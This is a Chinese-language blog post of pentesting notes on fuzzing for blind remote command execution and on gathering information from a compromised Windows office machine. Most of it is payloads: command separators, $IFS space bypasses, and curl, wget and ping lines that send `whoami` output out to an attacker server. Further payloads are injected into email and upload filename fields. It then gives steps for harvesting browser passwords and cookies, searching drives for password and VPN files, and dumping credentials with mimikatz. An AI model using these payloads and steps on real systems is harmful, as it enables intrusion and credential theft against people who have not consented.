---
layout: post
toc: true
title: "「Fuzz」:浅谈一些模糊匹配搜集信息的技巧"
author: Bin4xin
categories:
    - blog
tags:
    - 笔记
    - fuzz
    - 信息搜集
permalink: /blog/2020/learn/to/fuzz/
---

写在文前：

> 我们在web攻防期间有很多时候有一种感觉：那就是遇到rce漏洞时，bp放包的时候有一种隐隐的感觉，有的时候bp的反包字节大小莫名其妙的怪异，有经验的老师傅就索性直接跑RCE的fuzz字典，所以本篇就日常记录一些有关于web攻防期间的一些fuzz技巧

# 服务器RCE的fuzz技巧

* Windows机器的fuzz

即我们可以在关键参数后面使用管道符号和连接符fuzz命令执行实现我们的盲打：

`||和&`
 
* linux机器的fuzz

同上

`||和&`

* Linux下过滤空格可以使用:
```
${IFS},$IFS,$IFS$9
```

* JSON格式下的测试:
```
\u000awget\u0020 http://ip
```

Linux下可以包括反引号，windows下不可以。

## Linux下正常测试rce:
```bash
服务器启动web，注意需要处于监听状态下启动：

bin4xin@bin4xin's MacbookPro tools % python3 -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...

```
rce fuzz命令如下：
```bash
bin4xin@bin4xin's MacbookPro tools % curl 192.168.101.51:8000/`whoami`
```
同时我们反过来看web日志记录：
```bash
::ffff:192.168.101.51 - - [19/Sep/2020 13:57:25] "GET /bin4xin HTTP/1.1" 301 -
```
同理各位可以发散思维：

ping `whoami`.服务器地址

如上，ping、curl同样适用。


一些特殊字符绕过姿势:

```bash
curl http://服务器地址/$(whoami)

curl http://服务器地址/$(whoami|base64)

'w'g'e't${IFS}服务器地址
```
各位可以自行实验在linux下的效果。

## Windows探测:

fuzz技巧是一样的，只是fuzz命令有一些区别；
```bash
ping %USERNAME%.服务器地址
------
(获取计算机名)
for /F %x in ('whoami') do start http://服务器地址/%x
------
(获取用户名称)
for /F "delims=\ tokens=2" %i in ('whoami') do ping -n 1 %i.服务器地址
------
测试邮箱:`wget%209服务器地址/xxxx`@qq.com

测试上传:`sleep 10`filename

测试filenname:`||wget%20服务器地址`

测试上传处下的名称: ;payload|payload&payload
;whoami|whoami&whoami
------
```

# 个人机器信息收集

1. 浏览器[Chrome,Firefox,Edge,IE,360,QQ ]信息(历史记录，密码，书签，cookie)：

   ```
   %LocalAppData%\Google\Chrome\User Data\Default
   %APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\
   ```

2. 机器内敏感文件，关键词：账号、密码、备份、登录、管理、邮箱、后台、资产、网络

   ```
   for /r D:\ %i in (*密码*) do @echo %i
   for /r D:\ %i in (*vpn*) do @echo %i
   for /r D:\ %i in (*账号*) do @echo %i
   ```

3. 机器进程

   * 杀软/edr
   * teamviewer/等远程管理工具
   * 服务类进程：mssql/java/web服务

4. 安装软件列表

5. 当前windows 凭证管理器存储的密码

   * 登录密码（mimikatz）

   * wifi密码

   * outlook密码

   * ……

6. 机器开放端口信息/防火墙信息/获取机器共享

   ```
   netstat -naop
   wmic share  get name,path,status  #利用wmic查找共享
   ```

7. 获取机器所有rdp连接记录

8. 获取所有盘符

   ```
   wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size #查看分区
   ```

9. 获取全盘所有敏感文件

   .doc\xlsx\md\sql\ppt*\txt

   ```
   for /r D:\ %i in (*.doc) do @echo %i
   for /r D:\ %i in (*.xlsx) do @echo %i
   for /r D:\ %i in (*.ppt*)) do @echo %i
   ```

10. 本地环境
    * hosts
    * 环境变量
    * 补丁列表
    * 当前主机的会话信息

工作不饱和 总结了一下个人办公机信息收集思路